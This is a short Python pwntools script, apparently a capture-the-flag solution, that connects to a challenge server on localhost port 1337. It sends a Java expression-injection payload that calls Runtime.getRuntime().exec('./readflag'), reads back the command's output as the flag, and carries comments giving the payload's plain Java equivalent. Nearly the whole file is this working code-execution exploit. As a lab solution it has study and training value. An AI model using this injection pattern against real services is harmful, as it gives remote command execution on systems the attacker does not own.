# %%
from pwn import * # pip install pwntools

# %%

# set logging level
# context.log_level = 'debug'

# connect to the server
conn = remote('localhost', 1337)

# Read the input
print(conn.recvline())


# send the payload
conn.sendline(b"readLine( java.io.BufferedReader.new ( java.io.InputStreamReader.new ( getInputStream(exec( java.lang.Runtime.getRuntime (), './readflag'))))) ")


# this is equivalent to this in JAVA:
# BufferedReader(
#   InputStreamReader(
#     getRuntime().exec('./readflag').getInputStream()
#   )
# ).readLine()


# the payload without the absolute paths:
# readLine(
#  BufferedReader.new(
#   InputStreamReader.new(
#   getInputStream( exec( getRuntime(), './readflag' ) )
#   )
#  )
# )


# print the response 
flag = conn.recvline().decode('utf-8')
print("Flag: " + flag)
